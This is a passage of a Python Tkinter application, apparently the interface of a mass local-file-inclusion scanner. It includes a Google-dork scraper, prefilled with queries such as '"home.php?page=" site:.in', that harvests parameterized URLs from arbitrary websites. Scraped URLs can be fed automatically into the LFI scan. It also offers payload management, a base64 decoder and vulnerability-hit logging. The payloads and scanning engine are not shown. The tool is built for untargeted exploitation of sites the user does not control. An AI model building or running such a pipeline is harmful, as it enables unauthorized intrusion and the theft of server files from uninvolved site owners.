        self.tree.bind("<Button-3>", self.show_context_menu)

        # Scanner Logs with Filter Search Field
        log_outer = ttk.LabelFrame(left_frame, text="Scanner Live Categorized Logs", padding=5)
        log_outer.pack(fill="both", expand=True, pady=5)

        log_filter_row = ttk.Frame(log_outer)
        log_filter_row.pack(fill="x", pady=2)
        ttk.Label(log_filter_row, text="Log Filter:").pack(side="left", padx=2)
        self.log_filter_var = tk.StringVar()
        log_filter_entry = ttk.Entry(log_filter_row, textvariable=self.log_filter_var, width=25)
        log_filter_entry.pack(side="left", padx=2)
        ttk.Button(log_filter_row, text="Apply Filter", command=self.apply_log_filter).pack(side="left", padx=2)
        ttk.Button(log_filter_row, text="Clear Log", command=lambda: self.log_text.delete("1.0", "end")).pack(side="right", padx=2)

        self.log_text = tk.Text(log_outer, height=6, wrap="none", bg="#1e1e1e", fg="#d4d4d4", font=("Consolas", 9))
        self.log_text.pack(fill="both", expand=True, pady=2)
        self.log_text.tag_config("INFO", foreground="#4ec9b0")
        self.log_text.tag_config("SUCCESS", foreground="#b5cea8")
        self.log_text.tag_config("WARNING", foreground="#ce9178")
        self.log_text.tag_config("ERROR", foreground="#f44747")
        self.log_text.tag_config("VULN", foreground="#ff5370", background="#3a0000")

        # Right Frame: Payloads Manager + Base64 Decoder Tool
        payload_frame = ttk.LabelFrame(main_paned, text="Payloads & Base64 Decoder", padding=8)
        main_paned.add(payload_frame, weight=1)

        ttk.Label(payload_frame, text="Active Test Payloads:").pack(anchor="w")
        self.payload_listbox = tk.Listbox(payload_frame, height=8, font=("Consolas", 9))
        self.payload_listbox.pack(fill="both", expand=True, pady=5)
        self.refresh_payload_list()

        p_add_frame = ttk.Frame(payload_frame)
        p_add_frame.pack(fill="x", pady=2)
        ttk.Label(p_add_frame, text="Name:").pack(anchor="w")
        self.p_name_entry = ttk.Entry(p_add_frame)
        self.p_name_entry.pack(fill="x", pady=2)
        ttk.Label(p_add_frame, text="Payload Value:").pack(anchor="w")
        self.p_val_entry = ttk.Entry(p_add_frame)
        self.p_val_entry.pack(fill="x", pady=2)

        btn_p_row = ttk.Frame(payload_frame)
        btn_p_row.pack(fill="x", pady=2)
        ttk.Button(btn_p_row, text="Add Payload", command=self.add_custom_payload).pack(side="left", padx=2)
        ttk.Button(btn_p_row, text="Remove Selected", command=self.remove_custom_payload).pack(side="left", padx=2)

        file_p_row = ttk.Frame(payload_frame)
        file_p_row.pack(fill="x", pady=2)
        ttk.Button(file_p_row, text="Browse Payload File (.txt)", command=self.browse_payload_file_async).pack(fill="x")

        b64_frame = ttk.LabelFrame(payload_frame, text="Base64 Decoder Utility", padding=5)
        b64_frame.pack(fill="x", pady=5)
        ttk.Label(b64_frame, text="Encoded String:").pack(anchor="w")
        self.b64_input = ttk.Entry(b64_frame)
        self.b64_input.pack(fill="x", pady=2)
        ttk.Button(b64_frame, text="Decode Base64", command=self.decode_base64_string).pack(fill="x", pady=2)

        # Tab 2: Visual Smart Link Scraper
        scraper_tab = ttk.Frame(self.main_notebook, padding=10)
        self.main_notebook.add(scraper_tab, text="Multi-Query Smart Scraper")

        s_top = ttk.LabelFrame(scraper_tab, text="Google Multi-Dork Input & Filter Configuration", padding=10)
        s_top.pack(fill="x", pady=5)

        ttk.Label(s_top, text="Dork/Site Queries (One per line, e.g. \"home.php?page=\" site:.in):").pack(anchor="w")
        self.scraper_queries_text = tk.Text(s_top, height=4, wrap="none")
        self.scraper_queries_text.pack(fill="x", pady=5)
        self.scraper_queries_text.insert("1.0", '"home.php?page=" site:.in\n"home.php?page=" site:.org')

        s_filters = ttk.Frame(scraper_tab, padding=5)
        s_filters.pack(fill="x", pady=5)

        ttk.Label(s_filters, text="Required Path:").grid(row=0, column=0, sticky="w", padx=5)
        self.scraper_path_entry = ttk.Entry(s_filters, textvariable=self.scraper_path_var, width=20)
        self.scraper_path_entry.grid(row=0, column=1, sticky="w", padx=5)

        ttk.Label(s_filters, text="Required Parameter:").grid(row=0, column=2, sticky="w", padx=5)
        self.scraper_param_entry = ttk.Entry(s_filters, textvariable=self.scraper_param_var, width=20)
        self.scraper_param_entry.grid(row=0, column=3, sticky="w", padx=5)

        ttk.Label(s_filters, text="Max Pages:").grid(row=0, column=4, sticky="w", padx=5)
        ttk.Spinbox(s_filters, from_=1, to=30, textvariable=self.scraper_pages_var, width=8).grid(row=0, column=5, sticky="w", padx=5)

        ttk.Checkbutton(scraper_tab, text="Auto-start LFI Scan upon Scraping Completion", variable=self.auto_scan_var).pack(anchor="w", padx=5, pady=2)

        s_btn_frame = ttk.Frame(scraper_tab, padding=5)
        s_btn_frame.pack(fill="x")
        self.scraper_start_btn = ttk.Button(s_btn_frame, text="Start Multi-Query Scraper", command=self.start_scraper)
        self.scraper_start_btn.pack(side="left", padx=5)
        self.scraper_stop_btn = ttk.Button(s_btn_frame, text="Stop Scraper", command=self.stop_scraper, state="disabled")
        self.scraper_stop_btn.pack(side="left", padx=5)

        s_log_frame = ttk.LabelFrame(scraper_tab, text="Visual Scraper Execution Logs", padding=5)
        s_log_frame.pack(fill="both", expand=True, pady=5)
        self.scraper_log_text = tk.Text(s_log_frame, wrap="none", bg="#1e1e1e", fg="#d4d4d4", font=("Consolas", 9))
        self.scraper_log_text.pack(fill="both", expand=True)

    def log_message(self, msg, level="INFO"):
        self.log_text.insert("end", msg + "\n", level)
        self.log_text.see("end")

    def apply_log_filter(self):
        term = self.log_filter_var.get().strip().lower()
        content = self.log_text.get("1.0", "end")
        self.log_text.delete("1.0", "end")
        for line in content.splitlines():
            if not term or term in line.lower():
                lvl = "INFO"
                if "VULN" in line or "HIT" in line: lvl = "VULN"
                elif "ERROR" in line: lvl = "ERROR"
                elif "WARNING" in line: lvl = "WARNING"
                elif "SUCCESS" in line: lvl = "SUCCESS"
                self.log_text.insert("end", line + "\n", lvl)

    def decode_base64_string(self):
        val = self.b64_input.get().strip()
        if not val:
            return
        try:
            decoded = base64.b64decode(val).decode('utf-8', errors='ignore')
            messagebox.showinfo("Base64 Decoded Result", f"Decoded Output:\n\n{decoded}")
        except Exception as e:
            messagebox.showerror("Error", f"Invalid Base64 string: {e}")

    def refresh_payload_list(self):
        self.payload_listbox.delete(0, "end")
        for name, val in self.scanner.custom_probes:
            self.payload_listbox.insert("end", f"{name} -> {val}")

    def add_custom_payload(self):
        name = self.p_name_entry.get().strip()
        val = self.p_val_entry.get().strip()
        if not name or not val:
            messagebox.showwarning("Error", "Please enter both Payload Name and Value.")
            return
        self.scanner.custom_probes.append((name, val))
        self.refresh_payload_list()
        self.p_name_entry.delete(0, "end")
        self.p_val_entry.delete(0, "end")

    def remove_custom_payload(self):
        sel = self.payload_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        if len(self.scanner.custom_probes) <= 1:
            messagebox.showwarning("Warning", "At least one payload must remain.")
            return
        del self.scanner.custom_probes[idx]
        self.refresh_payload_list()

    def browse_payload_file_async(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            threading.Thread(target=self._load_payload_file_background, args=(path,), daemon=True).start()

    def _load_payload_file_background(self, path):
        try:
            lines = Path(path).read_text(encoding="utf-8", errors="ignore").splitlines()
            count = 0
            for line in lines:
                line = line.strip()
                if line and not line.startswith("#"):
                    self.scanner.custom_probes.append((f"FILE_PAYLOAD_{count+1}", line))
                    count += 1
            self.root.after(0, self.refresh_payload_list)
            self.root.after(0, lambda: messagebox.showinfo("Success", f"Loaded {count} custom payloads from file successfully!"))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Failed to load payload file: {e}"))

    def browse_file_async(self):
        path = filedialog.askopenfilename(filetypes=[("Text/CSV/Excel", "*.txt *.csv *.xlsx *.xlsm"), ("All files", "*.*")])
        if path:
            self.url_file.set(path)
            threading.Thread(target=self._load_file_background, args=(path,), daemon=True).start()

    def _load_file_background(self, path):
        try:
            urls = Scanner.read_url_file(path)
            self.root.after(0, lambda: self._append_urls_to_text(urls))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Failed loading file: {e}"))

    def _append_urls_to_text(self, urls):
        for u in urls:
            self.url_text.insert("end", u + "\n")
        messagebox.showinfo("Success", f"Successfully loaded {len(urls)} URLs from file without freezing!")

    def scraper_log(self, msg, level="INFO"):
        self.scraper_log_text.insert("end", msg + "\n", level)
        self.scraper_log_text.see("end")

    def on_url_live_scraped(self, url):
        self.root.after(0, lambda: self.url_text.insert("end", url + "\n"))

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            menu = tk.Menu(self.root, tearoff=0)
            menu.add_command(label="View Request & Response in New Tab", command=lambda: self.open_req_res_tab(item))
            menu.add_command(label="Copy URL", command=lambda: self.copy_selected_url(item))
            menu.add_command(label="Open Response in Browser", command=lambda: self.open_response_in_browser(item))
            menu.tk_popup(event.x_root, event.y_root)

    def copy_selected_url(self, item):
        values = self.tree.item(item, "values")
        if values:
            url = values[7] if len(values) > 7 else ""
            self.root.clipboard_clear()
            self.root.clipboard_append(url)
            messagebox.showinfo("Copied", "URL copied to clipboard successfully!")

    def open_response_in_browser(self, item):
        values = self.tree.item(item, "values")
        if not values:
            return
        clicked_url = values[7] if len(values) > 7 else values[8]
        finding_obj = None
        for f in self.scanner.findings:
            if f.url == clicked_url:
                finding_obj = f
                break
        
        res_text = finding_obj.full_response if finding_obj else "No response recorded."
        try:
            with tempfile.NamedTemporaryFile('w', delete=False, suffix='.html', encoding='utf-8') as tf:
                tf.write(f"<pre style='background:#111;color:#0f0;padding:15px;'>{res_text}</pre>")
                temp_name = tf.name
            webbrowser.open('file://' + temp_name)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open in browser: {e}")

    def open_req_res_tab(self, item):
        values = self.tree.item(item, "values")
        if not values:
            return
        clicked_url = values[7] if len(values) > 7 else values[8]
        
        finding_obj = None
        for f in self.scanner.findings:
            if f.url == clicked_url:
                finding_obj = f
                break
        
        req_text = finding_obj.full_request if finding_obj else "Request data not available."
        res_text = finding_obj.full_response if finding_obj else "Response data not available."

        tab_frame = ttk.Frame(self.main_notebook, padding=10)
        tab_title = f"Req/Res: {urlparse(clicked_url).path or 'Details'}"
        self.main_notebook.add(tab_frame, text=tab_title)
        self.main_notebook.select(tab_frame)

        top_ctrl = ttk.Frame(tab_frame)
        top_ctrl.pack(fill="x", pady=5)

        ttk.Label(top_ctrl, text="Filter Search:").pack(side="left", padx=5)
        search_var = tk.StringVar()
        search_entry = ttk.Entry(top_ctrl, textvariable=search_var, width=30)
        search_entry.pack(side="left", padx=5)

        def do_search():
            term = search_var.get().strip()
            res_box.tag_remove("highlight", "1.0", "end")
            if not term:
                return
            idx = "1.0"
            while True:
                idx = res_box.search(term, idx, nocase=1, stopindex="end")
                if not idx:
                    break
                end_idx = f"{idx}+{len(term)}c"
                res_box.tag_add("highlight", idx, end_idx)
                idx = end_idx

        ttk.Button(top_ctrl, text="Find", command=do_search).pack(side="left", padx=5)
        ttk.Button(top_ctrl, text="Close Tab", command=lambda: self.close_tab(tab_frame)).pack(side="right", padx=5)

        pane = ttk.PanedWindow(tab_frame, orient="vertical")
        pane.pack(fill="both", expand=True)

        req_frame = ttk.LabelFrame(pane, text="HTTP Request Details", padding=5)
        pane.add(req_frame, weight=1)
        r_box = tk.Text(req_frame, wrap="none", font=("Consolas", 10), bg="#1e1e1e", fg="#d4d4d4")
        r_box.pack(fill="both", expand=True)
        r_box.insert("1.0", req_text)

        res_frame = ttk.LabelFrame(pane, text="HTTP Response Details (Search Highlight Supported)", padding=5)
        pane.add(res_frame, weight=1)
        res_box = tk.Text(res_frame, wrap="none", font=("Consolas", 10), bg="#1e1e1e", fg="#d4d4d4")
        res_box.pack(fill="both", expand=True)
        res_box.insert("1.0", res_text)
        res_box.tag_config("highlight", background="yellow", foreground="black")

    def close_tab(self, tab_frame):
        self.main_notebook.forget(tab_frame)
        tab_frame.destroy()

    def start_scan(self):
        if self.scanner.running:
            return
        raw = self.url_text.get("1.0", "end").strip()
        count = self.scanner.load_urls(raw, self.url_file.get().strip())
        if count == 0:
            messagebox.showwarning(APP_NAME, "No valid parameterized URLs found to scan.")
            return

        self.tree.delete(*self.tree.get_children())
        self.progress_var.set(0)
        self.count_var.set("0 / 0")
        self.status_var.set(f"Loaded {count} URL(s) - Scanning Asynchronously...")

        try:
            workers = int(self.workers_var.get())
        except:
            workers = DEFAULT_WORKERS
        self.scanner.start(workers)

    def pause_scan(self):
        self.scanner.pause()
        self.status_var.set("Paused")

    def resume_scan(self):
        self.scanner.resume()
        self.status_var.set("Running")

    def stop_scan(self):
        self.scanner.stop()
        self.status_var.set("Stopping...")

    def save_report(self):
        count = self.scanner.save_reports()
        messagebox.showinfo(APP_NAME, f"Saved {count} records successfully.")

    def start_scraper(self):
        if self.scraper_worker and self.scraper_worker.is_alive():
            return

        queries_raw = self.scraper_queries_text.get("1.0", "end").strip()
        queries_list = queries_raw.splitlines()
        path = self.scraper_path_var.get().strip()
        param = self.scraper_param_var.get().strip()
        pages = self.scraper_pages_var.get()

        if not queries_list:
            messagebox.showwarning("Error", "Please provide at least one search query.")
            return

        self.scraper_start_btn.config(state="disabled")
        self.scraper_stop_btn.config(state="normal")
        self.scraper_log_text.delete("1.0", "end")
        self.url_text.delete("1.0", "end")

        def scraper_finished_callback(filename):
            self.root.after(0, lambda: self.on_scraper_stopped_automatically(filename))

        self.scraper_worker = LinkScraperWorker(queries_list, path, param, pages, self.scraper_log, self.on_url_live_scraped, scraper_finished_callback)
        self.scraper_worker.start()

    def stop_scraper(self):
        if self.scraper_worker and self.scraper_worker.is_alive():
            self.scraper_worker.stop()
            self.scraper_log("Stopping scraper requested by user...", "WARNING")

    def on_scraper_stopped_automatically(self, filename):
        self.scraper_start_btn.config(state="normal")
        self.scraper_stop_btn.config(state="disabled")
        messagebox.showinfo("Auto Transfer", "Scraper stopped! Filtered URLs populated into LFI Scanner.")
        
        if self.auto_scan_var.get():
            self.main_notebook.select(0)
            self.start_scan()

    def process_events(self):
        try:
            while True:
                kind, data = self.events.get_nowait()
                if kind == "log":
                    self.log_message(data, "INFO")
                elif kind == "stats":
                    self.count_var.set(f"0 / {data['total_tasks']}")
                elif kind == "progress":
                    done, total = data
                    self.progress_var.set((done / total * 100) if total else 0)
                    self.count_var.set(f"{done} / {total}")
                elif kind == "finding":
                    d = data
                    is_vuln = "VULNERABLE" in d["classification"]
                    row_tags = ("vulnerable",) if is_vuln else ()
                    
                    self.tree.insert("", "end", tags=row_tags, values=(
                        d["timestamp"], d["method"], d["parameter"], d["status"],
                        d["response_length"], d["classification"], d["evidence"], d["url"]
                    ))
                    if is_vuln:
                        self.log_message(f"[{d['classification']}] URL: {d['url']} | Param: '{d['parameter']}' | Evidence: {d['evidence']}", "VULN")
                elif kind == "done":
                    self.status_var.set(data)
                    self.scanner.save_reports()
        except queue.Empty:
            pass
        self.root.after(100, self.process_events)

    def close(self):
        if self.scanner.running:
            self.scanner.stop()
        if self.scraper_worker and self.scraper_worker.is_alive():
            self.scraper_worker.stop()
        self.root.destroy()


def main():
    root = tk.Tk()
    try:
        ttk.Style().theme_use("clam")
    except:
        pass
    App(root)
    root.mainloop()


if __name__ == "__main__":
    main()